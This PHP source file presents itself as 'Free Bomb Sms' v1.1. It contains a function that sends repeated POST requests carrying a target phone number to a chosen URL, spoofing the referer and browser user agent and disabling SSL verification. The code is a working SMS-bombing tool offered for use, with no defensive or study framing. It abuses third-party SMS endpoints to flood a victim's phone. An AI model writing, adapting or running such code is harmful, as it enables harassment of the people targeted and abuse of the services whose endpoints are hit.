<?php
/**
 * 
 *
 * @author Jlempar
 * @version v1.1
 * @copyright Organisation, default
 * @package default
 **/

/**
 * About FBS (Free Bomb Sms) *
 * Author : Afid Arifin
 * Version : v1.1
 * Realease as : Free
 * On :  27 July 2018
 **/

error_reporting(0);

function runBomb($_PHONE,$_TOTAL,$_DELAY,$_URL,$_REFF) {
	
	//looping
	$min = 0;
	while($min < $_TOTAL) {
		
		//curl
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $_URL);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $_PHONE);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($ch, CURLOPT_REFERER, $_REFF);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36');
		$server_output = curl_exec($ch);
		curl_close($ch);
		sleep($_DELAY);
		flush();
		$min++;
	}
	
	return $server_output;
}
?>